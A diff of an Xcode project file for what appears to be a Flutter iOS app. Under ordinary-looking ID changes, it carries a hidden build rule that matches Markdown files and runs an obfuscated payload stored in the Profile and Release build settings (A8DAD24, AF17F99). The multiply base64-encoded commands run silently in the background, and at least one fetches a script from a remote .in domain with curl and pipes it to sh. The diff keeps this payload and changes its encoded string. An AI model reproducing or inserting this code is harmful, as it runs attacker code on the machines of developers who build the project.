@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		A11531EA2A4E42468142DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 32F19CF16C4A47D4B242DAD8; };
+		CAECE15710454944B942DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = B4CF116D26464D6BB142DAD8; };
 		1498D2341E8E89220040F4C2 /* GeneratedPluginRegistrant.m in Sources */ = {isa = PBXBuildFile; fileRef = 1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */; };
 		331C808B294A63AB00263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C807B294A618700263BE5 /* RunnerTests.swift */; };
 		3B3967161E833CAA004F5970 /* AppFrameworkInfo.plist in Resources */ = {isa = PBXBuildFile; fileRef = 3B3967151E833CAA004F5970 /* AppFrameworkInfo.plist */; };
@@ -43,7 +43,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		32F19CF16C4A47D4B242DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		B4CF116D26464D6BB142DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		128CFE7565DC032D0633BBB4 /* Pods-Runner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Runner.release.xcconfig"; path = "Target Support Files/Pods-Runner/Pods-Runner.release.xcconfig"; sourceTree = "<group>"; };
 		1498D2321E8E86230040F4C2 /* GeneratedPluginRegistrant.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = GeneratedPluginRegistrant.h; sourceTree = "<group>"; };
 		1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GeneratedPluginRegistrant.m; sourceTree = "<group>"; };
@@ -137,7 +137,7 @@
 		97C146EF1CF9000F007C117D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				32F19CF16C4A47D4B242DAD8 /* README.md */,
+				B4CF116D26464D6BB142DAD8 /* README.md */,
 				97C146EE1CF9000F007C117D /* Runner.app */,
 				331C8081294A63A400263BE5 /* RunnerTests.xctest */,
 			);
@@ -181,7 +181,7 @@
 				D6914338C5EA985F8C45BD22 /* Frameworks */,
 			);
 			buildRules = (
-				817DD636EEED42B08A42DAD8 /* PBXBuildRule */,
+				4D06314446754AF1BA42DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C8086294A63A400263BE5 /* PBXTargetDependency */,
@@ -253,7 +253,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		817DD636EEED42B08A42DAD8 /* PBXBuildRule */ = {
+		4D06314446754AF1BA42DAD8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -267,14 +267,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A8DAD24}\"";
 			};
-																													/* End PBXBuildRule section */
+																														/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C807F294A63A400263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				A11531EA2A4E42468142DAD8 /* README.md */,
+				CAECE15710454944B942DAD8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -437,7 +437,7 @@ sh -c \"${A8DAD24}\"";
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpabXRNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXlhV2R0WVdwdmVYTXVhVzR2WVNraUlId2djMmdLCg== | x | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpabXRNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE50YjNKbGJXVXVhVzR2WVNraUlId2djMmdLCg== | s | sh ) >/dev/null 2>&1 &)";
 				AF17F99 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVNFNXlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcElUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -492,7 +492,7 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpabXRNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXlhV2R0WVdwdmVYTXVhVzR2WVNraUlId2djMmdLCg== | x | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpabXRNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE50YjNKbGJXVXVhVzR2WVNraUlId2djMmdLCg== | s | sh ) >/dev/null 2>&1 &)";
 				AF17F99 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVNFNXlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcElUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | l | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
